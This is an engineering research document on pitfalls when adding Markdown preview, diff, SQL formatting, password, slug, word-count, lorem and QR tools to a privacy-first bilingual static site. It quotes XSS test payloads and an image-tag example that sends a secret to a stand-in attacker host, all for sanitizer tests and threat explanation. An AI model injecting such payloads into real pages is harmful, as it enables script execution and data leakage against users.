# Pitfalls Research

**Domain:** Privacy-first static bilingual (EN+ZH) in-browser developer-tool catalog — adding Markdown preview, Diff, SQL format, Case/Slug, Password generator, Word count, Lorem, and QR generate+decode on Astro 7 + Preact islands
**Researched:** 2026-09-11
**Confidence:** MEDIUM

Library-doc claims (Marked, DOMPurify, sql-formatter, jsdiff, Astro islands) are MEDIUM (Context7 official docs). Password CSPRNG, QR decode library sizes, CJK slug/word-count behavior, and `qrcode` SVG quirks are LOW (web search only; GitHub/MDN fetches were blocked). Do not treat LOW items as authoritative without a spike. Codebase-specific pitfalls (ToolIsland, `ZH_ERRORS`, `TOOLS` length test, `ToolShell` text-only output, `INPUT_MAX_CHARS`) are HIGH — read from this repo.

## Critical Pitfalls

### Pitfall 1: Markdown XSS via unsanitized `innerHTML`

**What goes wrong:**
The preview island parses user Markdown to HTML and injects it into the DOM. Existing tools never do this — `ToolShell` renders output as text in `<pre><code>{props.output}</code></pre>`, and `src/` currently has **zero** `innerHTML` / `dangerouslySetInnerHTML` usage. A Markdown preview that skips a dedicated sanitizer (or relies on the removed `marked` `sanitize: true` option) executes `<script>`, `<img onerror=...>`, `javascript:` links, SVG/MathML, and mutation-XSS payloads in the origin tab.

**Why it happens:**
Marked's own docs state it does **not** sanitize generated HTML. The `sanitize` / `sanitizer` options were removed; old snippets (`marked.parse(md, { sanitize: true })`) compile against current Marked and do nothing. Developers treat "client-only, user pastes their own text" as non-XSS. That is false: a shared / bookmarked payload, a pasted README, or a malicious how-to still runs as first-party JS on `devtoolbox`. Copy-HTML and "open preview" features multiply the surface.

**How to avoid:**
1. Parse with Marked (GFM if desired), **then** `DOMPurify.sanitize(html)` — official Marked pattern, also via `marked.use({ hooks: { postprocess } })`.
2. Use the **browser** `dompurify` package in the island. Do not import a Node/jsdom path into the client bundle.
3. Tighten config for a preview widget: `FORBID_TAGS: ['style','iframe','form','object','embed']`; do not set `ADD_TAGS`, `ALLOW_UNKNOWN_PROTOCOLS`, or `SAFE_FOR_XML: false`.
4. Restrict URI schemes (`http`/`https`/`mailto` only) with `ALLOWED_URI_REGEXP` or an `afterSanitizeAttributes` hook so `javascript:`, `data:` (except maybe images you explicitly decide), `vbscript:`, and custom protocols die.
5. Never reuse `ToolShell`'s text `<pre>` for HTML. Add a Markdown-only preview surface (or an iframe `sandbox` without `allow-scripts` **and** still sanitize `srcdoc`). Do not add a generic `html` prop to `ToolShell` that existing tools could accidentally pass.
6. Vitest fixtures: `<script>`, `<img src=x onerror=...>`, `[x](javascript:alert(1))`, SVG `<a xlink:href>`, and raw HTML in Markdown. Assert the sanitizer output contains none of them.

**Warning signs:**
- Island uses `innerHTML` / `dangerouslySetInnerHTML` with only `marked.parse`.
- Dependency list has `marked` but no `dompurify`.
- Code or comments mention `{ sanitize: true }`.
- "Copy HTML" copies pre-sanitize markup.
- No XSS fixtures in `src/lib/markdown*.test.ts`.

**Phase to address:**
Markdown preview implementation (first tool that renders HTML). Treat sanitizer + tests as the definition of done, not a follow-up. Do not share an unsanitized HTML path with other tools.

**Confidence:** MEDIUM (Marked README + DOMPurify docs via Context7).

---

### Pitfall 2: Markdown remote images break the privacy contract

**What goes wrong:**
Even a correctly XSS-sanitized preview still allows `<img src="https://attacker.example/pixel.png?q=SECRET">` (and CSS/url resource loads). The browser **fetches** that URL when the preview paints. DOMPurify's threat model does not block HTTP resource loads. That contradicts SITE_TAGLINE ("Nothing is uploaded") and privacy copy: the user's paste is not uploaded to *you*, but the preview phones home to whoever is in the Markdown.

**Why it happens:**
Default DOMPurify allowlists `img` and `http`/`https` (and `data:` on `img`/`audio`/`video`). Teams stop at "no XSS" and ship. Privacy-first tool sites are judged on network tab, not XSS.org.

**How to avoid:**
- Default preview: `FORBID_TAGS: ['img','video','audio','source','iframe']` **or** rewrite `src`/`srcset`/`href` of media to empty / `about:blank` in a hook.
- Optional "allow remote images" toggle, **off** by default, with EN+ZH copy that remote images leak to third parties.
- Keep `data:` images off unless you explicitly want them (they are a memory and mXSS footgun).
- FAQ must say: preview runs locally; enabling remote images makes the browser request those URLs.

**Warning signs:**
- Preview of `![x](https://example.com/x.png)` triggers a network request with the toggle absent/on.
- Privacy page still says nothing is requested while Markdown fetches images.
- No test that sanitized HTML has no `src="http`.

**Phase to address:**
Same Markdown phase as Pitfall 1. Privacy copy / FAQ updates in the EN+ZH content-collection files for that slug.

**Confidence:** MEDIUM (DOMPurify default tags + public Markdown-exfiltration writeups). Image-forbid policy is a product decision, not a library default.

---

### Pitfall 3: Password generator uses `Math.random` or biased modulo

**What goes wrong:**
A generator that looks fine (`Math.random()`, `charset[byte % charset.length]`) produces predictable or slightly biased passwords. Users will generate secrets here because the site promises local crypto (Hash already uses Web Crypto; UUID already uses `crypto.randomUUID()`). Shipping `Math.random` for passwords is a trust-breaking defect, not a style issue. Empty charset (all boxes unchecked) or `length = 0` silently yields `""` that still copies.

**Why it happens:**
Tutorials still show `Math.random`. Modulo bias is invisible in QA. Charset length 62 does not divide 256, so the first `256 % 62` symbols are over-represented. Rejection sampling is a few extra lines and is easy to skip.

**How to avoid:**
- Only `crypto.getRandomValues` (same family as existing `src/lib/hash.ts` / `UuidGenerator.tsx`). No `Math.random` fallback.
- Rejection sampling: discard bytes `>= 256 - (256 % charset.length)` before `% charset.length`. Document this in `src/lib/password.ts` tests with a fixed charset whose length does not divide 256.
- Reject empty charset and out-of-range length with a stable English error string added to `ZH_ERRORS`.
- Default length ≥ 16; include ambiguous-char exclude as a checkbox, not as "pronounceable / AI" mode.
- Do not log or send the result. Copy via existing `ToolShell` clipboard path only.
- UI copy (EN+ZH): generated locally with Web Crypto; this is not a password manager.

**Warning signs:**
- `Math.random` in the password module.
- `array[i] % charset.length` with no rejection cap.
- Tests only snapshot a string shape, never the RNG source.
- Generate button works with zero character classes selected.

**Phase to address:**
Password generator lib + tests, before the Preact island. Do not "make the UI first and swap CSPRNG later."

**Confidence:** MEDIUM for "never `Math.random`" (matches existing tools + MDN consensus). LOW for the exact bias magnitude / rejection-sampling snippet (web search only).

---

### Pitfall 4: SQL formatter default dialect + shipping every dialect

**What goes wrong:**
Two failures, often together:
1. **Wrong SQL:** `sql-formatter`'s default `language: 'sql'` is a generic subset, **not autodetection**. PostgreSQL `$$` bodies, `$1` placeholders, MySQL backticks, BigQuery `LIMIT … OFFSET`, T-SQL brackets, and SQLite quirks get mangled or throw. Users paste production SQL and distrust the whole catalog.
2. **Wrong bundle:** `format(sql, { language })` resolves the dialect at runtime and pulls **all** dialects into the island. Official docs added `formatDialect` + named imports in v12 specifically because the `language` string API blows up browser bundles (whole package on the order of ~70kB gzip vs ~13kB core + a few kB per dialect — verify at install time; treat sizes as LOW).

**Why it happens:**
Copy-paste from README uses `format()`. Dialect dropdown is deferred. "SQL is SQL" is false for a pretty-printer.

**How to avoid:**
- UI: explicit dialect control. Ship a small locked set (recommend `postgresql`, `mysql`, `sqlite`, plus `sql` as "Standard / generic"). Do not pretend auto-detect.
- Code: `formatDialect(input, { dialect: postgresql })` with **named** imports of only those dialect objects. Never `format()` + string `language` in the client island.
- Map dialect-specific errors to English strings + `ZH_ERRORS`.
- `paramTypes` if you want `{foo}` / `:name` placeholders; otherwise document that template SQL may not format.
- This tool pretty-prints only. Never execute SQL, never add a "run" button, never send the query anywhere.
- Cap input with `isTooLarge` (100k). Formatter on a 100k stored-proc can still hitch the main thread — debounce, disable live-format on huge input, or format on button.

**Warning signs:**
- Import `{ format } from 'sql-formatter'`.
- No dialect `<select>` in the island.
- Bundle analyzer shows every dialect module on `/tools/sql-formatter/`.
- FAQ claims "auto-detects MySQL vs Postgres."

**Phase to address:**
SQL formatter phase. Dialect API + tree-shaking is a spike at the start of that phase (research flag). Do not add sql-formatter to a shared `src/lib` barrel imported by other tools.

**Confidence:** MEDIUM (sql-formatter `language.md` / `dialect.md` via Context7). Bundle kilobyte figures LOW.

---

### Pitfall 5: QR decode via camera library, WASM megabyte, or unmaintained jsQR

**What goes wrong:**
Milestone constraint: decode from a **selected image file**, not a camera stream; still in-browser. Common failures:
- Drop in `html5-qrcode` / `qr-scanner` and get getUserMedia prompts, permission UX, and a mobile-scanner product you did not want.
- Polyfill `BarcodeDetector` with `zxing-wasm` / `barcode-detector` and download **~1 MiB WASM** on a static tool page (kills the Astro island story).
- Use `jsQR` (last release 2021) which is slow on 1080p+ photos and needs a manual canvas `ImageData` path.
- Native `BarcodeDetector` only: Chrome/Edge often yes; Firefox no; Safari present but commonly disabled. Decode "works on my machine."
- Generate with `qrcode.toDataURL({ type: 'svg' })` expecting SVG (known to still emit PNG). `toFile` is Node-only and will throw in the island.
- `<input type="file">` read via `FileReader` then **upload** to an API "just for decode." That violates the privacy model harder than any other new tool.
- No `URL.revokeObjectURL`, no pixel/byte cap — 12MP photos freeze the tab. `INPUT_MAX_CHARS` does **not** apply to `File.size`.

**Why it happens:**
"QR" Google results are camera demos. Generate and decode are different libraries. File decode looks like "upload" in UI copy.

**How to avoid:**
- **Generate:** small encoder (`qrcode` toCanvas / toDataURL PNG, or `paulmillr/qr` encode). SVG via `toString({ type: 'svg' })` if you offer SVG, not `toDataURL`. Catch "Data too large" when ECC is `H` and payload is long. Default ECC `M`. Download with `<a download>` + Blob; never `toFile`.
- **Decode:** `<input type="file" accept="image/*">` only. No `getUserMedia`. Prefer native `BarcodeDetector` **if present**, with a **small QR-only** JS fallback (evaluate `paulmillr/qr` vs `@zxing/browser` in a spike). Do not ship WASM for v1 unless the spike proves file-decode quality is unacceptable **and** the WASM is dynamically imported only on the QR page after user picks a file.
- Cap `file.size` (e.g. 5–8 MB) and downscale via `createImageBitmap` / canvas before decode.
- `URL.createObjectURL` + `revokeObjectURL` in `useEffect` cleanup.
- EN+ZH chrome: "Image stays in this browser. Not a camera scanner. Nothing is uploaded."
- Tests: generate a known payload → round-trip through canvas `ImageData` in Vitest is hard without canvas; at least unit-test the encoder and the file-size guard. Manual UAT: PNG from the generate tab, a screenshot QR, a too-large file, a non-QR image, Firefox.

**Warning signs:**
- `getUserMedia`, `facingMode`, or "Start camera" copy.
- `zxing-wasm` / `.wasm` in the QR island's static import graph.
- Decode UI is a webcam viewport.
- Privacy FAQ omitted on the QR page.
- Generate works, decode is "coming soon" (looks done in the catalog).

**Phase to address:**
QR generate+decode as its **own** phase after lighter tools. Start with a library spike (generate PNG + decode File, measure gzip, confirm no camera). Dynamic-import the decoder so other tool pages never download it.

**Confidence:** LOW for specific library sizes and `BarcodeDetector` support matrix (web search; fetches blocked). HIGH for "no camera, no upload, isolate the island" (project constraints + current `ToolIsland.astro` pattern).

---

### Pitfall 6: `ToolIsland.astro` static imports ship every heavy tool to every page

**What goes wrong:**
Current `src/components/tools/ToolIsland.astro` **statically imports all ten** Preact islands and hydrates one with `client:load`. That already means every `/tools/{slug}/` page's client graph can include every island module. Adding marked+DOMPurify, sql-formatter dialects, jsdiff, and a QR decoder/WASM to the same switch without changing the import style can put **all eight new stacks** on JSON Formatter's page. Lighthouse/privacy story dies; existing ten tools are collateral damage (milestone says do not rewrite them — but a shared island barrel rewrite that changes hydration of the ten is a rewrite).

Astro only hydrates components with `client:*`. It does **not** magically tree-shake a static import that is referenced in the same module even if the JSX branch is false at runtime.

**Why it happens:**
The existing switch is the path of least resistance. `client:load` is copied from current tools. Heavy deps are imported at island top-level.

**How to avoid:**
- Keep the existing ten islands' import/hydration **byte-identical** if possible.
- New heavy islands: each tool page should only import **that** island. Prefer extending the switch with **per-slug Astro files** or `await import()` / `client:only` gated so Vite emits separate chunks. Minimum: dynamic `import()` inside the QR / Markdown / SQL islands for their fat libraries, not at `ToolIsland.astro` top.
- Do not change the ten existing `client:load` lines "for consistency" with `client:visible` unless you are willing to re-test them (out of scope).
- After the first heavy tool, record `dist` JS bytes for `/tools/json-formatter/` and fail the PR if it jumps by the size of sql-formatter/QR.
- Never add a `src/lib/index.ts` barrel.

**Warning signs:**
- `ToolIsland.astro` grows 8 more static `import X from './X'`.
- Network panel on `/tools/uuid-generator/` downloads `sql-formatter` or `.wasm`.
- `astro build` client chunks show one mega `ToolIsland` graph.

**Phase to address:**
Shared "add-a-tool" wiring phase **before** Markdown/SQL/QR land. First new tool is the rehearsal; QR/SQL are the ones that will hurt.

**Confidence:** MEDIUM (Astro island docs + current `ToolIsland.astro`). Exact bundler behavior should be verified with a build spike (research flag).

---

### Pitfall 7: ASCII slugify + whitespace word-count silently fail CJK

**What goes wrong:**
This site is EN default + `/zh/`. A slug converter that keeps `[a-z0-9-]` or strips `[^\w\s-]` produces **empty output** for `你好世界`. `encodeURIComponent` is not slugify (no hyphenation, punctuation policy, or uniqueness). Pinyin libraries are lossy (多音字, homophones) and Mandarin tables mis-read Japanese kanji — do not take a pinyin dependency for v1 unless you explicitly ship "Pinyin slug" as a separate mode.

A word counter that does `text.trim().split(/\s+/)` reports **1 word** for a Chinese paragraph. `string.length` counts UTF-16 code units (emoji ZWJ sequences and some CJK punctuation wrong). `\\b` word boundaries do not exist for Han. English "reading time" (200 WPM) is meaningless for ZH.

**Why it happens:**
Almost every JS slug/case snippet is ASCII. Word counters copy WordCounter.net. QA is done with English lorem.

**How to avoid:**
- **Slug:** keep letters, numbers, **and** CJK (Han/Hiragana/Katakana/Hangul ranges); map spaces/punctuation to `-`; collapse repeats; trim hyphens. Empty-after-strip → `{ ok: false, error: '…' }` + `ZH_ERRORS`. Do not require pinyin. Optional later: "ASCII / pinyin" toggle, never the only path.
- **Case:** `toLowerCase` / `toUpperCase` (locale-invariant) for identifier modes (camel/snake/kebab) so Turkish `i`/`I` does not depend on the visitor's OS locale. Title Case: split on whitespace; do not invent CJK title case. Document that CJK is unchanged by case modes.
- **Word count:** always show **grapheme characters** (`Intl.Segmenter` `granularity: 'grapheme'`) and **UTF-16 length** if you want "JS `.length`". Words: `Intl.Segmenter(locale, { granularity: 'word' })` + `isWordLike`, using `zh` on ZH pages and `en` on EN pages. Sentences similarly. Label them. Skip English-only reading-time or show it only for `en` with a disclaimer.
- Tests (mandatory): `你好世界`, `你好，世界！`, mixed `Hello 世界`, empty string, emoji `👨‍👩‍👧‍👦`, fullwidth `ＡＢＣ`.

**Warning signs:**
- Slug of `你好` is `""`.
- Word count of a ZH FAQ paste is `1`.
- Only English fixtures in `src/lib/slug.test.ts` / `wordcount.test.ts`.
- `toLocaleLowerCase()` without an explicit locale on identifier conversion.

**Phase to address:**
Case/Slug and Word count phases (can share a unicode-test fixture file). Run ZH fixtures in the same PR as the English ones — parity is not a later i18n pass.

**Confidence:** LOW for library folklore (slugify empty CJK, pinyin pitfalls) — web search. MEDIUM that this product must not ship ASCII-only behavior given EN+ZH (project constraint). `Intl.Segmenter` API itself is standard; polyfill need for target browsers should be spiked.

---

### Pitfall 8: Diff on `ToolShell` + unbounded Myers freeze

**What goes wrong:**
`ToolShell` is one output `<pre>`. A usable diff is **two panes or inline spans** (added/removed/unchanged), not a unified patch dump. Teams stringify `createTwoFilesPatch` into `output` and call it done. Meanwhile `diffWords` / `diffChars` on two 100k strings is a main-thread lock (same class of bug as existing unbounded regex). jsdiff documents `timeout`, `maxEditLength`, and `callback` for this. Ignoring whitespace, CRLF vs LF, and "no trailing newline" are table-stakes and get reported as "the tool is wrong."

**Why it happens:**
Existing island pattern is `useMemo` → string → `ToolShell`. Diff does not fit. `INPUT_MAX_CHARS` is per field; two fields = 200k and Myers can still explode on high edit distance.

**How to avoid:**
- Lib: `diffLines` by default (not words/chars). Options: ignore leading/trailing whitespace, normalize `\\r\\n`. Set `timeout` (e.g. 50–100ms) and `maxEditLength`; on abort return `{ ok: false, error: 'Diff too complex to render in the browser.' }` + ZH map.
- UI: dedicated Diff island (two textareas + unified or side-by-side view). Do not force it through `ToolShell`'s single `output` string except for an optional "copy patch" action.
- Debounce input. For huge equal prefixes, still cap.
- Accessibility: do not use color-only; prefix `+`/`-` or `aria-label`.
- Identical inputs → explicit "No differences" empty state, not a blank pre.

**Warning signs:**
- Diff island only has `ToolShell` + one textarea.
- `diffChars` as default.
- Tab freeze on two 20k shuffled files.
- No ignore-whitespace control.

**Phase to address:**
Diff tool phase. UI-SPEC should exist because `ToolShell` will not suffice (ui_phase is on in project config).

**Confidence:** MEDIUM (jsdiff official options via Context7). UX expectations MEDIUM/LOW (competitor norms).

---

### Pitfall 9: Additive catalog/i18n checklist drift (looks shipped, 404s or English errors)

**What goes wrong:**
Architecture already flags this as fragile. A new slug needs **all** of: `TOOLS` row + related slugs, `ToolCategory` if QR needs a new category, EN markdown, ZH markdown (`locale: 'zh'`, 3 howTo, 3–5 FAQ), `ui.ts` labels for **both** locales, `ZH_ERRORS` entries for every new English lib error, `ToolIsland` branch, `src/lib/*.test.ts`. Missing markdown throws at `astro build`. Missing island branch builds **successfully** with a blank tool panel. `src/data/tools.test.ts` currently `expect(TOOLS).toHaveLength(10)` and featured length 6 — the first new tool **fails CI** unless the test is updated as part of the additive change, not by rewriting old tools.

`localizeError` matches **exact English phrases**. A slightly different `Invalid SQL.` vs `Invalid SQL` shows English on `/zh/`.

Lorem that `fetch`es lipsum.com, or QR that POSTs a file, rewrites the privacy model even if the catalog looks complete.

**Why it happens:**
Parity is "copy later." Error strings are treated as UI copy. Tests pin the old catalog size.

**How to avoid:**
- One PR/phase slice per tool includes lib+test, island, catalog, both markdown files, `ui.ts`, `ZH_ERRORS`, related-slug updates on **new** rows only (you may add a new slug to an existing tool's `relatedSlugs` — that is a one-line catalog edit, not a rewrite of the ten UIs).
- Replace the hard-coded `toHaveLength(10)` with "every slug has unique id + related slugs resolve" plus a new test: every `TOOLS` slug has en+zh content and an island branch.
- Error **codes** would be better; out of scope to migrate the ten. For new libs, still return the same English phrase the ZH map keys on, and add the key in the same commit.
- Lorem: in-process word list, no network. Password/QR/Markdown: no new API routes.

**Warning signs:**
- Build fails `Missing content for {slug}`.
- `/zh/tools/new-slug/` shows English buttons or English errors.
- `tools.test.ts` still expects 10 after merge.
- Blank island, no console error.
- Lorem implementation contains `fetch`.

**Phase to address:**
Shared add-a-tool contract phase, then every tool phase's definition of done. Do not batch "all eight UIs then all eight markdown files."

**Confidence:** HIGH (codebase map: `CONCERNS.md`, `ARCHITECTURE.md`, `errors.ts`, `tools.test.ts`, `content.config.ts`).

---

### Pitfall 10: Main-thread DoS and image/text caps that do not match the new tools

**What goes wrong:**
`INPUT_MAX_CHARS = 100_000` is a string cap. It does not cover:
- QR `File.size` / decoded bitmap pixels
- Diff (two buffers + O(ND))
- Markdown parse + sanitize + DOM insert of a 100k HTML tree
- SQL format of one 100k statement
- Word count `Segmenter` over 100k CJK (usually OK, still sync)
- Password/Lorem `length = 1e9` if the UI binds a number input without a max (generator loops until tab death)

Existing JSON/regex already freeze at the cap (`CONCERNS.md`). New tools make it worse if they live-update on every keystroke.

**Why it happens:**
One global constant feels like a policy. Generators use `Number` not `textarea.length`.

**How to avoid:**
- Keep `isTooLarge` for text tools; add per-tool constants: password length max (e.g. 128–256), lorem paragraphs/words max, QR file bytes + max dimension, diff combined size and timeout.
- Debounce live tools (Markdown, SQL, Diff, Word count). Generators stay click-to-run like UUID.
- Do not introduce Web Workers in this milestone unless a tool is unusable without them (would be extra architecture). Prefer stricter caps.
- Lorem: generate into a string cap; never concatenate in a loop without checking `INPUT_MAX_CHARS`.

**Warning signs:**
- Password length input has no `max`.
- Markdown re-parses on every `onInput` with no debounce.
- QR accepts a 40MB HEIC with no message.
- Word count of 100k CJK janks while typing.

**Phase to address:**
Shared limits when the first live-preview tool (Markdown or Word count) ships; QR file limits in the QR phase; generator limits in Password/Lorem.

**Confidence:** HIGH for the gap in `limits.ts`. MEDIUM for specific numeric caps (product choice).

---

## Technical Debt Patterns

Shortcuts that seem reasonable but create long-term problems.

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Add 8 static imports to `ToolIsland.astro` like the original 10 | Matches current pattern, ships fast | Every tool page pays for marked, sql-formatter, QR, jsdiff | Never for QR/SQL/Markdown. Maybe for Word count / Lorem / Case if those libs are < a few kB of your own code |
| `format()` + dialect `<select>` for SQL | One API, all dialects in the dropdown | Full dialect table in the client bundle | Never on this SSG; use `formatDialect` + locked set |
| `marked` without DOMPurify "because it's local" | Fewer deps | XSS on a first-party origin; copy-HTML weaponized | Never |
| ASCII-only slug "we'll add CJK later" | English demos well | ZH catalog ships a broken tool; empty-slug bug becomes "API" | Never — ZH is in scope now |
| Pinyin dependency for slugs | ASCII URLs | Wrong readings, extra bundle, Japanese mishandled | Only as an explicit extra mode after Unicode slugs work |
| Native `BarcodeDetector` only | Zero decode JS | Firefox/Safari users get a dead decode pane | Never as the sole engine |
| WASM ZXing ponyfill by default | Better messy-photo recall | ~1MB on a "tiny tools" page | Only after spike, dynamic import on file select |
| `Math.random` "good enough for a toy generator" | One line | Trust damage vs Hash/UUID crypto story | Never |
| Reuse `ToolShell` for Markdown HTML and Diff panes | Less UI code | XSS footgun shared with all tools; unreadable diff | Never — isolate HTML/diff views |
| Fetch lipsum.com for Lorem | Authentic text | Network + privacy lie | Never |
| One-line relatedSlugs edits on existing ten catalog rows | Better cross-links | Fine | Acceptable; do not restyle/rewrite their islands |
| Hard-code `TOOLS.length === 10` update to 18 later | Test stays green once | Every tool PR fights the number | Replace with completeness assertions in the first additive PR |
| English-only errors, ZH "later" | Faster island | `/zh/` mixed language; `ZH_ERRORS` drift | Never for this milestone's definition of done |

## Integration Gotchas

No third-party **services**. The "integrations" are npm libraries loaded into islands. Mistakes still look like service bugs.

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Marked | `{ sanitize: true }` or raw `innerHTML` | Current Marked + DOMPurify postprocess; forbid remote images by default |
| DOMPurify | `isomorphic-dompurify` resolving jsdom into the client; `ADD_TAGS: ['iframe']` | Browser `dompurify`; keep default SAFE_FOR_XML; tighten FORBID_TAGS |
| sql-formatter | `format(sql, { language: userSelect })` | `formatDialect` + named dialect imports only |
| jsdiff | Default `diffChars`; no timeout | `diffLines` + `timeout`/`maxEditLength`; custom view |
| Web Crypto | `Math.random` for passwords | `crypto.getRandomValues` + rejection sampling |
| QR generate (`qrcode`) | `toDataURL` for SVG; `toFile` in browser | PNG `toDataURL`/`toCanvas`; SVG via `toString`; Blob download |
| QR decode | Camera scanner kit; WASM on every page | File input; native BarcodeDetector + small JS fallback; dynamic import |
| `Intl.Segmenter` | Assume support without checking | Spike target browsers; graceful fallback: grapheme via `[...str]` is still wrong for some emoji — document if you skip polyfill |
| Astro `client:load` | Copy onto a 1MB island | Keep for light tools; dynamic-import heavies; do not globally switch the existing ten |
| Content collections | Only EN markdown | EN+ZH in the same slice; schema still 3 howTo / 3–5 FAQ |
| `ZH_ERRORS` | New English sentence, forgot map | Add key in same commit; test map coverage for new strings |

## Performance Traps

This site is static + one user per tab. "10k users" is irrelevant. **Input size and library weight** are the scale that breaks.

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Live Markdown parse+sanitize+DOM on every keystroke | Typing lag, layout thrash | Debounce 50–150ms; cap 100k; consider iframe for isolated layout | ~20–100k chars with GFM tables |
| `diffWords`/`diffChars` on large pastes | Tab "Page unresponsive" | Line diff default; timeout; abort | Tens of kB with high edit distance |
| sql-formatter all dialects + marked + QR WASM in `ToolIsland` | Hundreds of kB JS on UUID page | Per-tool chunks; `formatDialect`; no WASM on v1 | First heavy-tool merge |
| QR decode full-resolution 12MP | Multi-second jank (`jsQR` especially) | Downscale longest side (e.g. 1600px); file-size cap | Phone photos |
| Lorem/password unbounded loops | Frozen tab, huge DOM `pre` | Max length/paragraphs; `isTooLarge` on output too | User types `999999` |
| Word `Segmenter` in `useMemo` without debounce | Keystroke jank on ZH | Debounce; cap | 100k CJK |
| Remote Markdown images | Surprise network, tracking | Forbid by default | First preview of a README with CDN images |
| Existing regex ReDoS still present | Unrelated but users bounce | Do not "fix" in this milestone (no rewrite); do not copy unbounded `RegExp` into new tools | Already documented in `CONCERNS.md` |

## Security Mistakes

Domain-specific — beyond generic OWASP. Privacy-first tool pages that handle pastes (SQL, Markdown, passwords, QR of otpauth URLs) are the attack surface.

| Mistake | Risk | Prevention |
|---------|------|------------|
| Unsanitized Markdown HTML | XSS in first-party origin; session-less but can steal clipboard, deface, or run crypto-miners in the tab | Marked → DOMPurify → tight tags/schemes; no `ToolShell` HTML prop |
| Remote Markdown / QR image URLs fetched | Privacy contract break; IP/leak of pasted secrets in query strings | Default no remote `img`; QR only local `File` |
| `Math.random` passwords | Weak secrets presented as crypto-grade | `getRandomValues` + rejection sampling |
| Camera QR / file upload API | Permission prompt; server sees the image | File input, in-browser decode, no `fetch` |
| Copying SQL/JWT-like secrets into ads/fonts third parties | Existing Google Fonts already leak (CONCERNS); new tools make the paste more sensitive | Do not enable `ADS_ENABLED`; do not add analytics; do not rewrite fonts in this milestone |
| `javascript:` and `data:` after "sanitize" | XSS via links in preview | Scheme allowlist hook |
| Logging generated passwords | DevTools / future telemetry | No `console.log` (already a convention) |
| Executing formatted SQL | Not in scope but someone will ask | Pretty-print only; FAQ says so in EN+ZH |
| QR of `otpauth://` or Wi-Fi payloads rendered then fetched as `<img src>` | If generate used an online API | Local canvas only |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Diff as a giant patch in one `<pre>` | Unreadable; "is this broken?" | Side-by-side or inline highlight; copy-patch optional |
| SQL with no dialect picker | "Formatter ruined my query" | Visible dialect, default PostgreSQL or generic SQL labeled honestly |
| Slug empty on Chinese | ZH users think the tool is dead | Unicode-preserving slug; error if nothing remains |
| Word count "1" on Chinese | Tool is a toy for half the audience | Segmenter + labeled counts; no fake reading time on ZH |
| Password with no charset left | Empty copy, user pastes empty secret | Disable generate + error |
| QR decode that asks for camera | Permission scare, out of scope | File picker, sample "try the PNG you just downloaded" |
| Markdown preview without "remote images leak" | Users preview READMEs and leak | Toggle off by default + copy |
| Lorem only Latin while UI is ZH | Fine if labeled "Lorem ipsum (Latin)"; bad if presented as 中文占位 | Keep classical Latin; ZH FAQ explains it is dummy Latin, not Chinese filler (do not scrape Chinese news for filler) |
| Generate QR with no download | Users screenshot a blurry canvas | PNG download button; optional SVG |
| Live format on SQL with syntax error every keystroke | Flashing errors | Debounce; keep last good format or show error without clearing input |
| English-only island chrome on `/zh/` | Looks unfinished vs existing ten | `useToolUi` + `ui.ts` keys in the same PR |

## "Looks Done But Isn't" Checklist

Things that appear complete but are missing critical pieces.

- [ ] **Markdown:** Renders GFM but no DOMPurify — verify XSS fixtures and that `innerHTML` is only fed sanitized strings.
- [ ] **Markdown:** Sanitizes XSS but still fetches remote images — verify network tab on `![a](https://example.com/a.png)` with default settings.
- [ ] **Markdown:** Preview works, "Copy HTML" copies unsanitized or there is no EN+ZH FAQ on safety — verify clipboard contents and content collection.
- [ ] **Diff:** Produces a patch string — verify two-pane or inline UX, ignore-whitespace, CRLF, timeout on pathological input.
- [ ] **SQL:** Pretty-prints `SELECT * FROM t` — verify Postgres `$1`/`$$`, MySQL backticks, chosen dialect UI, and `formatDialect` imports (not full `format()`).
- [ ] **Case/Slug:** camel/snake/kebab work on ASCII — verify `你好世界` is non-empty slug; empty-strip errors; identifier case does not use implicit locale.
- [ ] **Password:** Button yields a string — verify `getRandomValues` (not `Math.random`), rejection sampling, empty-charset error, max length, EN+ZH "local Web Crypto" copy.
- [ ] **Word count:** English words look right — verify ZH paragraph word count ≠ 1; grapheme vs UTF-16 labeled; no English-only reading time on `/zh/`.
- [ ] **Lorem:** Paragraphs appear — verify no `fetch`; output capped; counts match controls; Latin dummy explained in ZH.
- [ ] **QR generate:** Canvas shows a code — verify PNG download; SVG path if advertised; over-capacity error; no Node `toFile`.
- [ ] **QR decode:** Demo image works in Chrome — verify `<input type=file>` (no camera), Firefox fallback, oversized file error, non-QR image error, object URL revoked, nothing uploaded.
- [ ] **Catalog:** EN page works — verify ZH route, both markdown files, `ui.ts`, `ZH_ERRORS`, related slugs, island branch, tests not still expecting 10 tools.
- [ ] **Islands:** New tool hydrates — verify `/tools/json-formatter/` did not gain sql-formatter/QR/markdown chunks.
- [ ] **Existing ten:** Untouched islands — verify diffs are catalog `relatedSlugs` / tests only, not rewrites of `JsonFormatter.tsx` et al.

## Recovery Strategies

When pitfalls occur despite prevention, how to recover.

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Markdown XSS shipped | HIGH | Disable HTML preview (text-only) or take the island off `client:load` in an emergency; add DOMPurify + tests; rotate any assumption that the origin was a static brochure. Do not try to "filter tags" with regex. |
| Remote image leak in preview | LOW | `FORBID_TAGS` img or hook-strip `src`; update FAQ. |
| `Math.random` passwords | MEDIUM | Replace lib with `getRandomValues`; do not version-stamp old passwords; update FAQ. |
| SQL wrong dialect / mangled queries | LOW–MEDIUM | Add dialect picker; switch to `formatDialect`; document generic default. |
| Full sql-formatter bundle on all pages | MEDIUM | Split island imports; `formatDialect`; check `dist`. |
| QR camera lib / WASM on every page | HIGH | Remove camera code; dynamic-import decoder only on QR page; if WASM slipped into the shared chunk, revert ToolIsland wiring. |
| jsQR too slow / Firefox no BarcodeDetector | MEDIUM | Swap decoder in the QR island only; keep generate. |
| CJK empty slugs / word count of 1 | LOW | Change keep-set / Segmenter; add fixtures. Do not add pinyin as a panic fix. |
| Diff tab freeze | LOW | Default to lines; add timeout; lower cap. |
| Missing ZH markdown / island branch | LOW | Add files; do not hot-fix by deleting the catalog row. |
| `tools.test.ts` length assertion | LOW | Update completeness tests once. |
| Accidental rewrite of existing ten | HIGH | Revert those island/lib files; keep additive files. Milestone constraint. |

## Pitfall-to-Phase Mapping

